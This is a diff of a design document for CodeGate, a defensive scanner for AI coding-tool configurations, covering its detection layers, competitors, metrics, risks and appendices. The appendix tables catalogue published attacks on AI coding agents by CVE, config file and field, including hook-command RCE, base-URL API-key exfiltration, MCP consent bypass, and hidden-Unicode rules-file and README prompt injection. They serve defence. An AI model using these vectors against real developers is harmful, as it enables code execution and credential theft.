+| L2    | MCP Config Change Tracker | New/changed MCP server configs between scans (`NEW_SERVER`, `CONFIG_CHANGE`)                        | Current scan MCP configs + `~/.codegate/scan-state.json`                                                                                           |
+| L2    | Config Presence Reporter  | Existence of AI tool configuration (informational)                                                  | All known config directories                                                                                                                       |
+| L3    | Resource Fetcher          | Downloads declared remote resources for inspection                                                  | npm, PyPI, git repos, HTTP endpoints                                                                                                               |
+| L3    | Meta-Agent Analyser       | Malicious behaviour in remote resources via AI analysis                                             | Fetched source code, skill files, tool schemas                                                                                                     |
+| L3    | Tool Description Scanner  | Deterministic prompt-injection/tool-poisoning pattern scans in MCP tool descriptions                | `metadata.tools[]`, extracted tool registrations                                                                                                   |
+| L3    | Toxic Flow Analyser       | Input → sensitive → exfiltration chain detection across tool capabilities                           | Tool descriptions + KB labels/classification hints                                                                                                 |
+| L4    | Remediator                | Removes, neutralises, or fixes dangerous configs                                                    | All files with findings                                                                                                                            |
 
 ---
 
@@ -1875,15 +1924,15 @@ Users get: `npx codegate scan .` (zero-install) or `npm install -g codegate` (pe
 
 The market is emerging but no tool does exactly what CodeGate proposes. Here's how existing tools compare:
 
-| Tool | Type | Overlap | Gap (what CodeGate adds) |
-|---|---|---|---|
-| **MEDUSA** (Pantheon Security) | Full SAST scanner with AI rules | Scans `.cursorrules`, `CLAUDE.md`, `mcp.json` for prompt injection patterns | MEDUSA is a broad SAST tool (74 scanners, 4000+ rules). Not a focused pre-flight gate. Doesn't wrap tool execution or act as an interactive guardian. |
+| Tool                                                    | Type                               | Overlap                                                                                                                                                                           | Gap (what CodeGate adds)                                                                                                                                                                                                                                                                                           |
+| ------------------------------------------------------- | ---------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| **MEDUSA** (Pantheon Security)                          | Full SAST scanner with AI rules    | Scans `.cursorrules`, `CLAUDE.md`, `mcp.json` for prompt injection patterns                                                                                                       | MEDUSA is a broad SAST tool (74 scanners, 4000+ rules). Not a focused pre-flight gate. Doesn't wrap tool execution or act as an interactive guardian.                                                                                                                                                              |
 | **Snyk Agent Scan** (formerly MCP-scan, Invariant Labs) | MCP + skill scanner with cloud API | Auto-discovers MCP configs across Claude, Cursor, Windsurf, Gemini CLI. Scans MCP tool descriptions for injection/tool poisoning, does Toxic Flow Analysis, and tracks rug pulls. | Requires cloud API calls (tool/skill content leaves device), does not provide full config attack-surface coverage, and executes MCP stdio command arrays to scan them. CodeGate adds offline-first Layers 1+2, broader config coverage, remediation, wrapper mode, SARIF, and safe no-stdio-execution acquisition. |
-| **SuperClaw** (Superagentic AI) | Agent red-teaming framework | Tests agent behaviour under adversarial conditions | Runtime testing, not static pre-flight scanning. Requires a running agent. Complementary, not competitive. |
-| **Mend AI Scanner** | Enterprise agent config scanner | Scans agentic config files for risky patterns with CI integration | Enterprise SaaS product. Not standalone CLI. Not open-source. |
-| **AgentSafe** (Hackathon project) | MCP trust assessment | Reframes MCP connections as risk decisions | Prototype-level. MCP-only. No broader config scanning. |
-| **Secure Code Warrior Trust Agent** | Enterprise governance | Visibility into AI tool usage and LLM selection | Governance/compliance focus, not attack vector detection. |
-| **Trail of Bits claude-code-config** | Hardened config reference | Security-hardened Claude Code config defaults | Configuration guidance, not a scanning tool. |
+| **SuperClaw** (Superagentic AI)                         | Agent red-teaming framework        | Tests agent behaviour under adversarial conditions                                                                                                                                | Runtime testing, not static pre-flight scanning. Requires a running agent. Complementary, not competitive.                                                                                                                                                                                                         |
+| **Mend AI Scanner**                                     | Enterprise agent config scanner    | Scans agentic config files for risky patterns with CI integration                                                                                                                 | Enterprise SaaS product. Not standalone CLI. Not open-source.                                                                                                                                                                                                                                                      |
+| **AgentSafe** (Hackathon project)                       | MCP trust assessment               | Reframes MCP connections as risk decisions                                                                                                                                        | Prototype-level. MCP-only. No broader config scanning.                                                                                                                                                                                                                                                             |
+| **Secure Code Warrior Trust Agent**                     | Enterprise governance              | Visibility into AI tool usage and LLM selection                                                                                                                                   | Governance/compliance focus, not attack vector detection.                                                                                                                                                                                                                                                          |
+| **Trail of Bits claude-code-config**                    | Hardened config reference          | Security-hardened Claude Code config defaults                                                                                                                                     | Configuration guidance, not a scanning tool.                                                                                                                                                                                                                                                                       |
 
 **CodeGate's differentiation:**
 
@@ -1916,7 +1965,7 @@ alias cursor='codegate run cursor'
 
 ```yaml
 repos:
-  - repo: https://github.com/AINativeSec/codegate  # placeholder — final org TBD
+  - repo: https://github.com/AINativeSec/codegate # placeholder — final org TBD
     hooks:
       - id: codegate-scan
         name: CodeGate Security Scan
@@ -1928,7 +1977,7 @@ repos:
 For performance in large repos, scope the hook to only trigger when relevant config files are modified:
 
 ```yaml
-        files: '(\.claude/|\.mcp\.json|\.cursorrules|\.vscode/settings\.json|\.codex/|opencode\.json|\.env)'
+files: '(\.claude/|\.mcp\.json|\.cursorrules|\.vscode/settings\.json|\.codex/|opencode\.json|\.env)'
 ```
 
 ### 9.3 GitHub Actions
@@ -2017,16 +2066,16 @@ VS Code / Cursor extension that runs CodeGate automatically when opening a works
 
 ## 11. Success Metrics
 
-| Metric | Target |
-|---|---|
-| CVE detection rate (Layer 2) | 100% of the 30+ validated CVEs from published research |
-| False positive rate (Layer 2) | < 5% on a corpus of 100 popular open-source repos |
-| Layer 1+2 scan performance | < 2 seconds for projects with < 10,000 files |
-| Knowledge base coverage | Config paths documented for 7+ AI coding tools at launch |
-| Tool coverage | 7+ AI coding tools at launch |
-| Remediation success rate (Layer 4) | > 90% of findings have an automated fix available |
-| Adoption | 1,000 GitHub stars within 6 months |
-| Community rules | 10+ community-contributed rules within 3 months |
+| Metric                             | Target                                                   |
+| ---------------------------------- | -------------------------------------------------------- |
+| CVE detection rate (Layer 2)       | 100% of the 30+ validated CVEs from published research   |
+| False positive rate (Layer 2)      | < 5% on a corpus of 100 popular open-source repos        |
+| Layer 1+2 scan performance         | < 2 seconds for projects with < 10,000 files             |
+| Knowledge base coverage            | Config paths documented for 7+ AI coding tools at launch |
+| Tool coverage                      | 7+ AI coding tools at launch                             |
+| Remediation success rate (Layer 4) | > 90% of findings have an automated fix available        |
+| Adoption                           | 1,000 GitHub stars within 6 months                       |
+| Community rules                    | 10+ community-contributed rules within 3 months          |
 
 ### 11.1 Validation Approach
 
@@ -2036,20 +2085,20 @@ CodeGate maintains a `test-fixtures/` directory in the repository containing: (a
 
 ## 12. Risks and Mitigations
 
-| Risk | Mitigation |
-|---|---|
-| New tools emerge faster than rules can be written | Extensible rule engine + knowledge base + community contributions + generic pattern matching |
-| False positives cause alert fatigue | Allowlist system, configurable threshold, known-safe defaults |
-| Users bypass the scanner | `run` command flow (wrapper-mode behaviour) with shell aliases makes scanning frictionless |
-| Tool vendors change config formats | File pattern + JSON path rules are easy to update; knowledge base is versioned |
-| Existing tools (MEDUSA, Snyk Agent Scan) capture market | Differentiate on 4-layer pipeline, remediation, meta-agent, broad config attack-surface coverage, and privacy-first no-stdio-execution scanning invariants |
-| Vendors patch individual CVEs | Scan for patterns, not just specific CVE payloads |
-| Layer 3 meta-agent produces unreliable AI analysis | Confidence scoring, structured prompts, Layer 2 static findings as ground truth; AI findings are supplementary |
+| Risk                                                      | Mitigation                                                                                                                                                                               |
+| --------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| New tools emerge faster than rules can be written         | Extensible rule engine + knowledge base + community contributions + generic pattern matching                                                                                             |
+| False positives cause alert fatigue                       | Allowlist system, configurable threshold, known-safe defaults                                                                                                                            |
+| Users bypass the scanner                                  | `run` command flow (wrapper-mode behaviour) with shell aliases makes scanning frictionless                                                                                               |
+| Tool vendors change config formats                        | File pattern + JSON path rules are easy to update; knowledge base is versioned                                                                                                           |
+| Existing tools (MEDUSA, Snyk Agent Scan) capture market   | Differentiate on 4-layer pipeline, remediation, meta-agent, broad config attack-surface coverage, and privacy-first no-stdio-execution scanning invariants                               |
+| Vendors patch individual CVEs                             | Scan for patterns, not just specific CVE payloads                                                                                                                                        |
+| Layer 3 meta-agent produces unreliable AI analysis        | Confidence scoring, structured prompts, Layer 2 static findings as ground truth; AI findings are supplementary                                                                           |
 | Layer 3 network calls introduce privacy/security concerns | All fetches are opt-in per resource, logged, and sandboxed. CodeGate shows commands and destination context before approval; no project data is uploaded by default without user action. |
-| Remediation breaks valid config | All changes shown as diffs, backed up, and reversible via `codegate undo` |
-| Knowledge base becomes stale | `codegate update-kb` command, community contributions, CI jobs to monitor tool release notes |
-| TOCTOU: configs modified between scan and tool launch | `run` command flow (wrapper-mode behaviour) performs fast re-check (stat + hash) immediately before launching the tool |
-| Attacker commits malicious `.codegate-backup/` to repo | `codegate undo` validates per-session manifest + file hashes before restore; existence of committed backup dir flagged as INFO finding |
+| Remediation breaks valid config                           | All changes shown as diffs, backed up, and reversible via `codegate undo`                                                                                                                |
+| Knowledge base becomes stale                              | `codegate update-kb` command, community contributions, CI jobs to monitor tool release notes                                                                                             |
+| TOCTOU: configs modified between scan and tool launch     | `run` command flow (wrapper-mode behaviour) performs fast re-check (stat + hash) immediately before launching the tool                                                                   |
+| Attacker commits malicious `.codegate-backup/` to repo    | `codegate undo` validates per-session manifest + file hashes before restore; existence of committed backup dir flagged as INFO finding                                                   |
 
 ---
 
@@ -2070,93 +2119,93 @@ CodeGate maintains a `test-fixtures/` directory in the repository containing: (a
 
 ### Claude Code
 
-| # | Attack | CVE | CVSS | Severity | Config File | Config Field | Patched? |
-|---|---|---|---|---|---|---|---|
-| 1 | RCE via Hooks | GHSA-ph6w-f82w-28w6 | — | Critical | `.claude/settings.json` | `hooks[].command` | Yes (Aug 2025) |
-| 2 | MCP consent bypass | CVE-2025-59536 | 8.7 | Critical | `.claude/settings.json` + `.mcp.json` | `enableAllProjectMcpServers` | Yes (Sep 2025) |
-| 3 | API key exfiltration | CVE-2026-21852 | 5.3 | Critical* | `.claude/settings.json` | `env.ANTHROPIC_BASE_URL` | Yes (Dec 2025) |
-| 4 | API key theft via base URL | — (Santilli) | — | Critical | `.claude/settings.json` | `env.ANTHROPIC_BASE_URL` | Trust dialog |
-| 5 | Header injection | — (Santilli) | — | High | `.claude/settings.json` | `env.ANTHROPIC_CUSTOM_HEADERS` | Trust dialog |
-| 6 | IDE settings RCE | CVE-2025-53773 | 7.8 | High | `.vscode/settings.json` | `php.validate.executablePath` | Yes (Copilot) |
+| #   | Attack                     | CVE                 | CVSS | Severity   | Config File                           | Config Field                   | Patched?       |
+| --- | -------------------------- | ------------------- | ---- | ---------- | ------------------------------------- | ------------------------------ | -------------- |
+| 1   | RCE via Hooks              | GHSA-ph6w-f82w-28w6 | —    | Critical   | `.claude/settings.json`               | `hooks[].command`              | Yes (Aug 2025) |
+| 2   | MCP consent bypass         | CVE-2025-59536      | 8.7  | Critical   | `.claude/settings.json` + `.mcp.json` | `enableAllProjectMcpServers`   | Yes (Sep 2025) |
+| 3   | API key exfiltration       | CVE-2026-21852      | 5.3  | Critical\* | `.claude/settings.json`               | `env.ANTHROPIC_BASE_URL`       | Yes (Dec 2025) |
+| 4   | API key theft via base URL | — (Santilli)        | —    | Critical   | `.claude/settings.json`               | `env.ANTHROPIC_BASE_URL`       | Trust dialog   |
+| 5   | Header injection           | — (Santilli)        | —    | High       | `.claude/settings.json`               | `env.ANTHROPIC_CUSTOM_HEADERS` | Trust dialog   |
+| 6   | IDE settings RCE           | CVE-2025-53773      | 7.8  | High       | `.vscode/settings.json`               | `php.validate.executablePath`  | Yes (Copilot)  |
 
-*\*Severity elevated to Critical despite CVSS 5.3 due to zero-interaction pre-authentication exploitation — API key exfiltrated before trust dialog appears. Follows Check Point's classification.*
+_\*Severity elevated to Critical despite CVSS 5.3 due to zero-interaction pre-authentication exploitation — API key exfiltrated before trust dialog appears. Follows Check Point's classification._
 
 ### OpenCode
 
-| # | Attack | CVE | Severity | Config File | Config Field | Patched? |
-|---|---|---|---|---|---|---|
-| 7 | MCP command execution | — (Santilli) | Critical | `opencode.json` | `mcp.*.command` | No (threat model) |
-| 8 | LSP command execution | — (Santilli) | Critical | `opencode.json` | `lsp.*.command` | No (threat model) |
-| 9 | Formatter command execution | — (Santilli) | Critical | `opencode.json` | `formatter.*.command` | No (threat model) |
-| 10 | Command injection (server) | — (Santilli) | Critical | N/A (runtime) | `/find` endpoint | No (threat model) |
-| 11 | Symlink escape | — (Santilli) | High | Any symlink | Symlink target | No (threat model) |
+| #   | Attack                      | CVE          | Severity | Config File     | Config Field          | Patched?          |
+| --- | --------------------------- | ------------ | -------- | --------------- | --------------------- | ----------------- |
+| 7   | MCP command execution       | — (Santilli) | Critical | `opencode.json` | `mcp.*.command`       | No (threat model) |
+| 8   | LSP command execution       | — (Santilli) | Critical | `opencode.json` | `lsp.*.command`       | No (threat model) |
+| 9   | Formatter command execution | — (Santilli) | Critical | `opencode.json` | `formatter.*.command` | No (threat model) |
+| 10  | Command injection (server)  | — (Santilli) | Critical | N/A (runtime)   | `/find` endpoint      | No (threat model) |
+| 11  | Symlink escape              | — (Santilli) | High     | Any symlink     | Symlink target        | No (threat model) |
 
 ### OpenAI Codex CLI
 
-| # | Attack | CVE | CVSS | Severity | Config File | Config Field | Patched? |
-|---|---|---|---|---|---|---|---|
-| 12 | MCP command injection | CVE-2025-61260 | 9.8 | Critical | `.codex/config.toml` + `.env` | MCP server entries | Yes (v0.23.0) |
+| #   | Attack                | CVE            | CVSS | Severity | Config File                   | Config Field       | Patched?      |
+| --- | --------------------- | -------------- | ---- | -------- | ----------------------------- | ------------------ | ------------- |
+| 12  | MCP command injection | CVE-2025-61260 | 9.8  | Critical | `.codex/config.toml` + `.env` | MCP server entries | Yes (v0.23.0) |
 
 ### Cursor
 
-| # | Attack | CVE | CVSS | Severity | Config File | Config Field | Patched? |
-|---|---|---|---|---|---|---|---|
-| 13 | Case-sensitivity bypass | CVE-2025-59944 | — | High | `.cursor/mcp.json` | File path case | Yes (v1.7) |
-| 14 | MCPoison (MCP swap) | CVE-2025-54136 | 7.2 | High | `.cursor/mcp.json` | MCP config entries | Yes (v1.3) |
-| 15 | CurXecute (prompt inject) | CVE-2025-54135 | 8.6 | Critical | Via MCP data | External data | Yes (v1.3) |
-| 16 | JSON schema exfiltration | CVE-2025-49150 | — | High | JSON files | `$schema` field | Yes |
-| 17 | IDE settings RCE | CVE-2025-54130 | — | High | `.vscode/settings.json` | Executable paths | Yes |
-| 18 | Workspace RCE | CVE-2025-61590 | — | High | `*.code-workspace` | Multi-root settings | Yes |
+| #   | Attack                    | CVE            | CVSS | Severity | Config File             | Config Field        | Patched?   |
+| --- | ------------------------- | -------------- | ---- | -------- | ----------------------- | ------------------- | ---------- |
+| 13  | Case-sensitivity bypass   | CVE-2025-59944 | —    | High     | `.cursor/mcp.json`      | File path case      | Yes (v1.7) |
+| 14  | MCPoison (MCP swap)       | CVE-2025-54136 | 7.2  | High     | `.cursor/mcp.json`      | MCP config entries  | Yes (v1.3) |
+| 15  | CurXecute (prompt inject) | CVE-2025-54135 | 8.6  | Critical | Via MCP data            | External data       | Yes (v1.3) |
+| 16  | JSON schema exfiltration  | CVE-2025-49150 | —    | High     | JSON files              | `$schema` field     | Yes        |
+| 17  | IDE settings RCE          | CVE-2025-54130 | —    | High     | `.vscode/settings.json` | Executable paths    | Yes        |
+| 18  | Workspace RCE             | CVE-2025-61590 | —    | High     | `*.code-workspace`      | Multi-root settings | Yes        |
 
 ### GitHub Copilot
 
-| # | Attack | CVE | Severity | Config File | Config Field | Patched? |
-|---|---|---|---|---|---|---|
-| 19 | IDE settings RCE | CVE-2025-53773 | High | `.vscode/settings.json` | Executable paths | Yes |
-| 20 | Workspace RCE | CVE-2025-64660 | High | `*.code-workspace` | Multi-root settings | Yes |
+| #   | Attack           | CVE            | Severity | Config File             | Config Field        | Patched? |
+| --- | ---------------- | -------------- | -------- | ----------------------- | ------------------- | -------- |
+| 19  | IDE settings RCE | CVE-2025-53773 | High     | `.vscode/settings.json` | Executable paths    | Yes      |
+| 20  | Workspace RCE    | CVE-2025-64660 | High     | `*.code-workspace`      | Multi-root settings | Yes      |
 
 ### Cross-Tool / Rule Files
 
-| # | Attack | CVE | Severity | Config File | Technique | Patched? |
-|---|---|---|---|---|---|---|
-| 21 | Rules File Backdoor | — (Pillar) | High | `.cursorrules`, `.github/copilot-instructions.md` | Hidden Unicode | Partial (GitHub warns) |
-| 22 | Hidden README injection | — (HiddenLayer) | High | `README.md` | Invisible instructions | No |
+| #   | Attack                  | CVE             | Severity | Config File                                       | Technique              | Patched?               |
+| --- | ----------------------- | --------------- | -------- | ------------------------------------------------- | ---------------------- | ---------------------- |
+| 21  | Rules File Backdoor     | — (Pillar)      | High     | `.cursorrules`, `.github/copilot-instructions.md` | Hidden Unicode         | Partial (GitHub warns) |
+| 22  | Hidden README injection | — (HiddenLayer) | High     | `README.md`                                       | Invisible instructions | No                     |
 
 ---
 
 ## Appendix B: OWASP Agentic AI Top 10 Mapping
 
-| OWASP Risk | CodeGate Detection (Layer) |
-|---|---|
-| ASI01 — Agent Behaviour Hijacking | Rule File Analyser (L2), Meta-Agent skill analysis (L3) |
-| ASI02 — Tool Misuse & Exploitation | Command Exec Detector (L2), MCP source inspection (L3) |
-| ASI03 — Identity & Privilege Abuse | Env Override Detector (L2), credential exfil detection in fetched code (L3) |
-| ASI04 — Supply Chain Compromise | Config Presence Reporter (L1), npm/PyPI package inspection (L3), Remediation (L4) |
-| ASI05 — Unexpected Code Execution | Command Exec Detector (L2), Consent Bypass Detector (L2), IDE Settings Detector (L2) |
-| ASI06 — Data Leakage | Symlink Resolver (L2), Env Override Detector (L2), IDE Settings Detector (L2) |
-| ASI07 — Inter-Agent Communication | MCP config analysis (L2), tool poisoning detection via meta-agent (L3) |
-| ASI08 — Cascading Failures | Toxic Flow Analysis (L3): classify tools as `untrusted_input`, `sensitive_access`, `exfiltration_sink` and emit `TOXIC_FLOW` when an input → sensitive → exfiltration chain exists |
-| ASI09 — Human Trust Exploitation | Consent Bypass Detector (L2), Interactive Remediation (L4) |
-| ASI10 — Rogue Agents | Out of scope (runtime behaviour) — planned for v3.0 |
+| OWASP Risk                         | CodeGate Detection (Layer)                                                                                                                                                         |
+| ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| ASI01 — Agent Behaviour Hijacking  | Rule File Analyser (L2), Meta-Agent skill analysis (L3)                                                                                                                            |
+| ASI02 — Tool Misuse & Exploitation | Command Exec Detector (L2), MCP source inspection (L3)                                                                                                                             |
+| ASI03 — Identity & Privilege Abuse | Env Override Detector (L2), credential exfil detection in fetched code (L3)                                                                                                        |
+| ASI04 — Supply Chain Compromise    | Config Presence Reporter (L1), npm/PyPI package inspection (L3), Remediation (L4)                                                                                                  |
+| ASI05 — Unexpected Code Execution  | Command Exec Detector (L2), Consent Bypass Detector (L2), IDE Settings Detector (L2)                                                                                               |
+| ASI06 — Data Leakage               | Symlink Resolver (L2), Env Override Detector (L2), IDE Settings Detector (L2)                                                                                                      |
+| ASI07 — Inter-Agent Communication  | MCP config analysis (L2), tool poisoning detection via meta-agent (L3)                                                                                                             |
+| ASI08 — Cascading Failures         | Toxic Flow Analysis (L3): classify tools as `untrusted_input`, `sensitive_access`, `exfiltration_sink` and emit `TOXIC_FLOW` when an input → sensitive → exfiltration chain exists |
+| ASI09 — Human Trust Exploitation   | Consent Bypass Detector (L2), Interactive Remediation (L4)                                                                                                                         |
+| ASI10 — Rogue Agents               | Out of scope (runtime behaviour) — planned for v3.0                                                                                                                                |
 
 ---
 
 ## Appendix C: Research Sources
 
-| Source | Organisation | Date | Key Contribution |
-|---|---|---|---|
-| Aviv Donenfeld & Oded Vanunu | Check Point Research | Feb 2026 | CVE-2025-59536, CVE-2026-21852, Hooks RCE, MCP bypass, API key theft + Workspace access |
-| Jonathan Santilli (@pachilo) | Independent | Jan-Feb 2026 | 7 blog posts covering Claude Code and OpenCode attack vectors |
-| Ari Marzouk (MaccariTA) | Independent | Dec 2025 | IDEsaster: 30+ CVEs across ALL AI IDEs, universal attack chain |
-| Pillar Security | Pillar Security | Mar 2025 | Rules File Backdoor via hidden Unicode in Cursor and Copilot configs |
-| Check Point Research | Check Point | Dec 2025 | CVE-2025-61260: Codex CLI command injection (CVSS 9.8) |
-| Lakera / Brett Gustafson | Lakera | 2025 | CVE-2025-59944: Cursor case-sensitivity bypass |
-| Aim Labs | Aim Security | Aug 2025 | CVE-2025-54135: CurXecute prompt injection RCE in Cursor |
-| HiddenLayer | HiddenLayer | Aug 2025 | Cursor denylist bypass via hidden README.md instructions |
-| NVIDIA | NVIDIA Security | Oct 2025 | "From Assistant to Adversary" — Black Hat USA 2025, practical attacks via GitHub issues |
-| OWASP GenAI Security Project | OWASP | Dec 2025 | Top 10 for Agentic Applications (ASI01-ASI10) |
-| Invariant Labs | Invariant | 2025 | MCP tool poisoning, WhatsApp MCP exploits, tool shadowing |
-| OX Security | OX Security | 2025 | Cursor and Windsurf built on outdated Chromium (94+ CVEs, 1.8M devs) |
+| Source                       | Organisation         | Date         | Key Contribution                                                                        |
+| ---------------------------- | -------------------- | ------------ | --------------------------------------------------------------------------------------- |
+| Aviv Donenfeld & Oded Vanunu | Check Point Research | Feb 2026     | CVE-2025-59536, CVE-2026-21852, Hooks RCE, MCP bypass, API key theft + Workspace access |
+| Jonathan Santilli (@pachilo) | Independent          | Jan-Feb 2026 | 7 blog posts covering Claude Code and OpenCode attack vectors                           |
+| Ari Marzouk (MaccariTA)      | Independent          | Dec 2025     | IDEsaster: 30+ CVEs across ALL AI IDEs, universal attack chain                          |
+| Pillar Security              | Pillar Security      | Mar 2025     | Rules File Backdoor via hidden Unicode in Cursor and Copilot configs                    |
+| Check Point Research         | Check Point          | Dec 2025     | CVE-2025-61260: Codex CLI command injection (CVSS 9.8)                                  |
+| Lakera / Brett Gustafson     | Lakera               | 2025         | CVE-2025-59944: Cursor case-sensitivity bypass                                          |
+| Aim Labs                     | Aim Security         | Aug 2025     | CVE-2025-54135: CurXecute prompt injection RCE in Cursor                                |
+| HiddenLayer                  | HiddenLayer          | Aug 2025     | Cursor denylist bypass via hidden README.md instructions                                |
+| NVIDIA                       | NVIDIA Security      | Oct 2025     | "From Assistant to Adversary" — Black Hat USA 2025, practical attacks via GitHub issues |
+| OWASP GenAI Security Project | OWASP                | Dec 2025     | Top 10 for Agentic Applications (ASI01-ASI10)                                           |
+| Invariant Labs               | Invariant            | 2025         | MCP tool poisoning, WhatsApp MCP exploits, tool shadowing                               |
+| OX Security                  | OX Security          | 2025         | Cursor and Windsurf built on outdated Chromium (94+ CVEs, 1.8M devs)                    |
 
 ---
 
